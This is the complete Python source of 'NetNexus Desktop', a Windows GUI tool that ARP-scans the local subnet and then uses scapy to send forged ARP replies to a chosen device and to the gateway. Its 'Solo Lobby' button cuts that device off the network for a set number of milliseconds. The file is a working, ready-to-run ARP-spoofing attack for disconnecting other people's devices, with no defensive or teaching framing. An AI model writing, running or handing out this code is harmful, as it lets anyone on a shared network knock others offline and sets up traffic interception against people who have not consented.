import os
import time
import threading
import socket
import sys
import ctypes
import logging
from scapy.all import ARP, Ether, srp, sendp, conf

try:
    import customtkinter as ctk
except ImportError:
    ctypes.windll.user32.MessageBoxW(0, "customtkinter is not installed. Please run: pip install customtkinter", "Missing Dependency", 0)
    sys.exit(1)

# Configure Appearance
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.user32.MessageBoxW(0, "This application requires Administrative privileges.\n\nPlease restart your terminal as Administrator.", "ADMIN REQUIRED", 0)
    sys.exit(1)

# --- Application State ---
state = {
    "scanning": False,
    "gateway_ip": "",
    "subnet": "192.168.1.0/24",
    "iface": None,
    "devices": [], # list of dicts: {'ip': str, 'mac': str, 'vendor': str}
    "active_attacks": {}, # dict of ip: threading.Event()
    "solo_lobby_active": False,
    "solo_lobby_timer": 0,
    "nicknames": {} # dict of mac: str
}

def get_default_network_info():
    try:
        iface, local_ip, gw_ip = conf.route.route("0.0.0.0")
        subnet = f"{local_ip.rsplit('.', 1)[0]}.0/24"
        return gw_ip, subnet, iface
    except:
        return "192.168.1.1", "192.168.1.0/24", conf.iface

state["gateway_ip"], state["subnet"], state["iface"] = get_default_network_info()

# --- Backend Network Logic ---
def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=state["iface"], timeout=2, verbose=0)
        if ans: return ans[0][1].hwsrc
    except: pass
    return None

def spoof_loop(target_ip, gateway_ip, stop_event):
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac or not gateway_mac: return
        while not stop_event.is_set():
            # Use sendp with Layer 2 headers to avoid Scapy warnings
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), iface=state["iface"], verbose=0)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=state["iface"], verbose=0)
            time.sleep(2)
    except: pass

def run_arp_scan(subnet):
    state["scanning"] = True
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), iface=state["iface"], timeout=5, retry=1, verbose=0)
        
        found_devices = []
        for s, r in ans:
            mac = r.hwsrc
            vendor = conf.manufdb._resolve_MAC(mac)
            if vendor == mac: vendor = "Unknown"
            found_devices.append({'ip': r.psrc, 'mac': mac, 'vendor': vendor})
            
        existing_ips = [d['ip'] for d in state["devices"]]
        for d in found_devices:
            if d['ip'] not in existing_ips:
                state["devices"].append(d)
    except Exception as e:
        print(f"[!] Scan error: {e}")
    finally:
        state["scanning"] = False

def timed_intercept_logic(target_ip, gateway_ip, duration_ms):
    state["solo_lobby_active"] = True
    state["solo_lobby_timer"] = float(duration_ms) / 1000.0
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac: return
        
        stop_event = threading.Event()
        threading.Thread(target=spoof_loop, args=(target_ip, gateway_ip, stop_event), daemon=True).start()
        
        while state["solo_lobby_timer"] > 0:
            time.sleep(0.1)
            state["solo_lobby_timer"] -= 0.1
            
        stop_event.set()
        
        if target_mac and gateway_mac:
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
            
    except Exception as e:
        print(f"[!] Timed cut error: {e}")
    finally:
        state["solo_lobby_active"] = False
        state["solo_lobby_timer"] = 0

# --- GUI Application ---
class NetNexusApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        self.title("NetNexus Desktop")
        self.geometry("1100x600")
        
        # Grid layout
        self.grid_rowconfigure(2, weight=1)
        self.grid_columnconfigure(0, weight=1)
        
        # 1. Header Frame
        self.header_frame = ctk.CTkFrame(self)
        self.header_frame.grid(row=0, column=0, padx=20, pady=20, sticky="ew")
        
        self.title_lbl = ctk.CTkLabel(self.header_frame, text="NetNexus", font=ctk.CTkFont(size=24, weight="bold"), text_color="#3b82f6")
        self.title_lbl.grid(row=0, column=0, padx=20, pady=15)
        
        self.subnet_var = ctk.StringVar(value=state["subnet"])
        self.subnet_lbl = ctk.CTkLabel(self.header_frame, text="Subnet:")
        self.subnet_lbl.grid(row=0, column=1, padx=5)
        self.subnet_entry = ctk.CTkEntry(self.header_frame, textvariable=self.subnet_var, width=120)
        self.subnet_entry.grid(row=0, column=2, padx=5)
        
        self.gateway_var = ctk.StringVar(value=state["gateway_ip"])
        self.gateway_lbl = ctk.CTkLabel(self.header_frame, text="Gateway:")
        self.gateway_lbl.grid(row=0, column=3, padx=5)
        self.gateway_entry = ctk.CTkEntry(self.header_frame, textvariable=self.gateway_var, width=120)
        self.gateway_entry.grid(row=0, column=4, padx=5)
        
        self.scan_btn = ctk.CTkButton(self.header_frame, text="Scan Network", command=self.start_scan)
        self.scan_btn.grid(row=0, column=5, padx=20)
        
        # 2. Solo Lobby Banner (Hidden initially)
        self.banner_frame = ctk.CTkFrame(self, fg_color="#7f1d1d", border_width=2, border_color="#ef4444")
        self.banner_lbl = ctk.CTkLabel(self.banner_frame, text="Solo Lobby Active: 12.0s", font=ctk.CTkFont(size=20, weight="bold"), text_color="#fca5a5")
        self.banner_lbl.pack(pady=10)
        
        # 3. Device Table (Scrollable Frame)
        self.table_frame = ctk.CTkScrollableFrame(self)
        self.table_frame.grid(row=2, column=0, padx=20, pady=(0, 20), sticky="nsew")
        self.table_frame.grid_columnconfigure((0,1,2,3,4,5,6), weight=1)
        
        # Table Headers
        headers = ["IP Address", "MAC Address", "Vendor", "Nickname", "Status", "Time (ms)", "Actions"]
        for i, h in enumerate(headers):
            lbl = ctk.CTkLabel(self.table_frame, text=h, font=ctk.CTkFont(weight="bold"))
            lbl.grid(row=0, column=i, padx=5, pady=5, sticky="w")
            
        self.device_rows = []
        
        # Start UI Update Loop
        self.after(100, self.update_ui)
        self.populate_table()
        
    def start_scan(self):
        if not state["scanning"]:
            state["subnet"] = self.subnet_var.get()
            state["gateway_ip"] = self.gateway_var.get()
            state["devices"] = []
            self.scan_btn.configure(state="disabled", text="Scanning...")
            threading.Thread(target=run_arp_scan, args=(state["subnet"],), daemon=True).start()
            self.populate_table()

    def update_nickname_var(self, mac, str_var):
        state["nicknames"][mac] = str_var.get()

    def trigger_solo_lobby(self, ip, time_var):
        if not state["solo_lobby_active"] and ip != state["gateway_ip"]:
            try:
                duration_ms = int(time_var.get())
            except ValueError:
                duration_ms = 8000
            threading.Thread(target=timed_intercept_logic, args=(ip, state["gateway_ip"], duration_ms), daemon=True).start()

    def populate_table(self):
        # Clear existing rows
        for row in self.device_rows:
            for widget in row:
                widget.destroy()
        self.device_rows.clear()
        
        if not state["devices"] and not state["scanning"]:
            lbl = ctk.CTkLabel(self.table_frame, text="No devices found. Run a scan.", text_color="gray")
            lbl.grid(row=1, column=0, columnspan=7, pady=20)
            self.device_rows.append([lbl])
            return

        for r_idx, dev in enumerate(state["devices"], start=1):
            ip_lbl = ctk.CTkLabel(self.table_frame, text=dev["ip"])
            ip_lbl.grid(row=r_idx, column=0, padx=5, pady=5, sticky="w")
            
            mac_lbl = ctk.CTkLabel(self.table_frame, text=dev["mac"])
            mac_lbl.grid(row=r_idx, column=1, padx=5, pady=5, sticky="w")
            
            vendor_lbl = ctk.CTkLabel(self.table_frame, text=dev["vendor"])
            vendor_lbl.grid(row=r_idx, column=2, padx=5, pady=5, sticky="w")
            
            # Nickname Entry
            nick_var = ctk.StringVar(value=state["nicknames"].get(dev["mac"], ""))
            nick_entry = ctk.CTkEntry(self.table_frame, textvariable=nick_var, width=150)
            nick_entry.grid(row=r_idx, column=3, padx=5, pady=5, sticky="w")
            # Trace changes immediately
            nick_var.trace_add("write", lambda name, index, mode, m=dev["mac"], v=nick_var: self.update_nickname_var(m, v))
            
            # Status Badge
            is_cut = dev["ip"] in state["active_attacks"] or state["solo_lobby_active"]
            status_text = "Disconnected" if is_cut else "Connected"
            status_color = "#ef4444" if is_cut else "#10b981"
            status_lbl = ctk.CTkLabel(self.table_frame, text=status_text, text_color=status_color)
            status_lbl.grid(row=r_idx, column=4, padx=5, pady=5, sticky="w")
            
            # Time Entry
            time_var = ctk.StringVar(value="8000")
            time_entry = ctk.CTkEntry(self.table_frame, textvariable=time_var, width=80)
            time_entry.grid(row=r_idx, column=5, padx=5, pady=5, sticky="w")
            
            # Solo Button
            solo_btn = ctk.CTkButton(self.table_frame, text="Solo Lobby", width=100, 
                command=lambda ip=dev["ip"], tv=time_var: self.trigger_solo_lobby(ip, tv))
            solo_btn.grid(row=r_idx, column=6, padx=5, pady=5, sticky="w")
            
            self.device_rows.append([ip_lbl, mac_lbl, vendor_lbl, nick_entry, status_lbl, time_entry, solo_btn])

    def update_ui(self):
        # Update Scan button
        if state["scanning"]:
            self.scan_btn.configure(state="disabled", text="Scanning...")
        else:
            self.scan_btn.configure(state="normal", text="Scan Network")
            if len(state["devices"]) > 0 and len(self.device_rows) <= 1:
                self.populate_table()
            
        # Update Banner
        if state["solo_lobby_active"]:
            self.banner_frame.grid(row=1, column=0, padx=20, pady=10, sticky="ew")
            self.banner_lbl.configure(text=f"Solo Lobby Active: {max(0, state['solo_lobby_timer']):.1f}s")
        else:
            self.banner_frame.grid_forget()
            
        # Update connection status labels dynamically
        for r_idx, dev in enumerate(state["devices"]):
            if r_idx < len(self.device_rows) and len(self.device_rows[r_idx]) == 7:
                # Disable buttons if solo lobby is running globally
                btn = self.device_rows[r_idx][6]
                if state["solo_lobby_active"]:
                    btn.configure(state="disabled")
                else:
                    btn.configure(state="normal")
                
                is_cut = dev["ip"] in state["active_attacks"] or state["solo_lobby_active"]
                status_lbl = self.device_rows[r_idx][4]
                status_text = "Disconnected" if is_cut else "Connected"
                status_color = "#ef4444" if is_cut else "#10b981"
                status_lbl.configure(text=status_text, text_color=status_color)

        self.after(100, self.update_ui)

if __name__ == "__main__":
    app = NetNexusApp()
    app.mainloop()
